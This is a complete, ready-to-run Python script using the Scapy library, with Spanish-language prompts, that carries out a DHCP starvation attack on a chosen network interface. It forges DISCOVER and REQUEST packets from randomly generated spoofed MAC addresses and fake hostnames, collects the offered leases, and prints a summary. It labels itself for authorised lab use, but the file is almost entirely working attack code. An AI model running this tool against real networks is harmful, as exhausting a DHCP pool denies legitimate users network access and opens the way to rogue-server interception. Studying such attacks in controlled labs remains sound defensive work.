```python
import os
import random
import signal
import subprocess
import sys
import time

from scapy.all import BOOTP, DHCP, Ether, IP, UDP, AsyncSniffer, conf, get_if_hwaddr, mac2str, sendp

running = True
responses = {}


def stop_handler(sig, frame):
    global running
    running = False


signal.signal(signal.SIGINT, stop_handler)
signal.signal(signal.SIGTERM, stop_handler)


def require_root():
    if hasattr(os, "geteuid") and os.geteuid() != 0:
        print("Ejecuta este script con sudo")
        sys.exit(1)


def run_cmd(cmd):
    try:
        return subprocess.check_output(cmd, text=True, stderr=subprocess.DEVNULL).strip()
    except Exception:
        return ""


def list_interfaces():
    return [i for i in sorted(os.listdir("/sys/class/net")) if i != "lo"]


def get_interface_info(iface):
    info = run_cmd(["ip", "-br", "addr", "show", iface])
    return info if info else iface


def choose_interface():
    interfaces = list_interfaces()

    print("")
    print("Interfaces disponibles:")
    print("")

    for index, iface in enumerate(interfaces, 1):
        print(f"{index}. {get_interface_info(iface)}")

    print("")

    default_iface = "eth0" if "eth0" in interfaces else interfaces[0]

    while True:
        value = input(f"Interfaz conectada al switch [Enter = {default_iface}]: ").strip()

        if value == "":
            return default_iface

        if value.isdigit():
            pos = int(value)
            if 1 <= pos <= len(interfaces):
                return interfaces[pos - 1]

        if value in interfaces:
            return value

        print("Interfaz inválida")


def ask_int(label, default_value, minimum, maximum):
    while True:
        value = input(f"{label} [Enter = {default_value}]: ").strip()

        if value == "":
            return default_value

        try:
            number = int(value)
        except Exception:
            print("Valor inválido")
            continue

        if minimum <= number <= maximum:
            return number

        print(f"El valor debe estar entre {minimum} y {maximum}")


def ask_float(label, default_value, minimum, maximum):
    while True:
        value = input(f"{label} [Enter = {default_value}]: ").strip()

        if value == "":
            return default_value

        try:
            number = float(value)
        except Exception:
            print("Valor inválido")
            continue

        if minimum <= number <= maximum:
            return number

        print(f"El valor debe estar entre {minimum} y {maximum}")


def ask_text(label, default_value):
    value = input(f"{label} [Enter = {default_value}]: ").strip()
    return default_value if value == "" else value


def wait_enter():
    print("")
    input("Presiona Enter para iniciar el ataque en el laboratorio")


def random_mac():
    mac = [
        0x02,
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
    ]

    return ":".join(f"{byte:02x}" for byte in mac)


def get_dhcp_option(pkt, option_name):
    if DHCP not in pkt:
        return None

    for option in pkt[DHCP].options:
        if isinstance(option, tuple) and option[0] == option_name:
            return option[1]

    return None


def get_dhcp_type(pkt):
    value = get_dhcp_option(pkt, "message-type")

    names = {
        1: "discover",
        2: "offer",
        3: "request",
        4: "decline",
        5: "ack",
        6: "nak",
        7: "release",
        8: "inform",
    }

    if isinstance(value, int):
        return names.get(value)

    return value


def packet_handler(pkt):
    if BOOTP not in pkt or DHCP not in pkt:
        return

    xid = pkt[BOOTP].xid
    dhcp_type = get_dhcp_type(pkt)

    if dhcp_type not in ["offer", "ack", "nak"]:
        return

    if xid not in responses:
        responses[xid] = []

    responses[xid].append(pkt)


def wait_response(xid, valid_types, timeout):
    end_time = time.time() + timeout

    while time.time() < end_time and running:
        packets = responses.get(xid, [])

        for pkt in packets:
            if get_dhcp_type(pkt) in valid_types:
                return pkt

        time.sleep(0.01)

    return None


def build_discover(client_mac, xid, hostname):
    return (
        Ether(src=client_mac, dst="ff:ff:ff:ff:ff:ff")
        / IP(src="0.0.0.0", dst="255.255.255.255")
        / UDP(sport=68, dport=67)
        / BOOTP(chaddr=mac2str(client_mac), xid=xid, flags=0x8000)
        / DHCP(
            options=[
                ("message-type", "discover"),
                ("client_id", b"\x01" + mac2str(client_mac)),
                ("hostname", hostname),
                ("param_req_list", [1, 3, 6, 15, 28, 51, 54, 58, 59]),
                "end",
            ]
        )
    )


def build_request(client_mac, xid, hostname, requested_ip, server_id):
    return (
        Ether(src=client_mac, dst="ff:ff:ff:ff:ff:ff")
        / IP(src="0.0.0.0", dst="255.255.255.255")
        / UDP(sport=68, dport=67)
        / BOOTP(chaddr=mac2str(client_mac), xid=xid, flags=0x8000)
        / DHCP(
            options=[
                ("message-type", "request"),
                ("client_id", b"\x01" + mac2str(client_mac)),
                ("requested_addr", requested_ip),
                ("server_id", server_id),
                ("hostname", hostname),
                ("param_req_list", [1, 3, 6, 15, 28, 51, 54, 58, 59]),
                "end",
            ]
        )
    )


def main():
    require_root()

    print("")
    print("DHCP Starvation rápido para laboratorio autorizado")
    print("")

    iface = choose_interface()
    count = ask_int("Cantidad de clientes falsos", 200, 1, 5000)
    interval = ask_float("Pausa entre intentos", 0.02, 0, 5)
    offer_timeout = ask_float("Tiempo máximo para esperar OFFER", 0.60, 0.05, 10)
    ack_timeout = ask_float("Tiempo máximo para esperar ACK", 0.40, 0.05, 10)
    hostname_prefix = ask_text("Prefijo de hostname falso", "LAB-CLIENT")

    try:
        real_mac = get_if_hwaddr(iface)
    except Exception:
        real_mac = "desconocida"

    print("")
    print("Configuración:")
    print(f"Interfaz: {iface}")
    print(f"Info: {get_interface_info(iface)}")
    print(f"MAC real: {real_mac}")
    print(f"Clientes falsos: {count}")
    print(f"Pausa: {interval}")
    print(f"Timeout OFFER: {offer_timeout}")
    print(f"Timeout ACK: {ack_timeout}")
    print(f"Hostname falso: {hostname_prefix}")
    print("")

    wait_enter()

    conf.iface = iface
    conf.verb = 0

    sniffer = AsyncSniffer(
        iface=iface,
        filter="udp and (port 67 or port 68)",
        prn=packet_handler,
        store=False,
    )

    sniffer.start()
    time.sleep(0.2)

    discovers = 0
    requests = 0
    offers = 0
    acks = 0
    naks = 0
    no_offer = 0
    no_ack = 0
    leases = []

    print("")
    print("Ataque iniciado")
    print("Presiona Ctrl+C para detener")
    print("")

    start_time = time.time()

    for index in range(1, count + 1):
        if not running:
            break

        client_mac = random_mac()
        hostname = f"{hostname_prefix}-{index}"
        xid = random.randint(1, 0xFFFFFFFF)

        discover = build_discover(client_mac, xid, hostname)
        sendp(discover, iface=iface, verbose=False)
        discovers += 1

        offer = wait_response(xid, ["offer"], offer_timeout)

        if offer is None:
            no_offer += 1
            print(f"[{index}] Sin OFFER mac={client_mac}")
            time.sleep(interval)
            continue

        offers += 1
        offered_ip = offer[BOOTP].yiaddr
        server_id = get_dhcp_option(offer, "server_id")

        if server_id is None:
            server_id = offer[IP].src

        request = build_request(client_mac, xid, hostname, offered_ip, server_id)
        sendp(request, iface=iface, verbose=False)
        requests += 1

        ack = wait_response(xid, ["ack", "nak"], ack_timeout)

        if ack is None:
            no_ack += 1
            print(f"[{index}] OFFER {offered_ip} sin ACK")
        else:
            response_type = get_dhcp_type(ack)

            if response_type == "nak":
                naks += 1
                print(f"[{index}] NAK {offered_ip}")
            else:
                acks += 1
                leases.append((offered_ip, client_mac))
                print(f"[{index}] ACK {offered_ip} mac={client_mac}")

        time.sleep(interval)

    try:
        sniffer.stop()
    except Exception:
        pass

    elapsed = time.time() - start_time

    print("")
    print("Resumen:")
    print(f"DISCOVER enviados: {discovers}")
    print(f"REQUEST enviados: {requests}")
    print(f"OFFER recibidos: {offers}")
    print(f"ACK recibidos: {acks}")
    print(f"NAK recibidos: {naks}")
    print(f"Sin OFFER: {no_offer}")
    print(f"Sin ACK: {no_ack}")
    print(f"Tiempo total: {elapsed:.1f} segundos")

    if leases:
        print("")
        print("Leases obtenidos:")
        for ip_addr, mac_addr in leases:
            print(f"{ip_addr} {mac_addr}")

    print("")
    print("Finalizado")


if __name__ == "__main__":
    main()
```
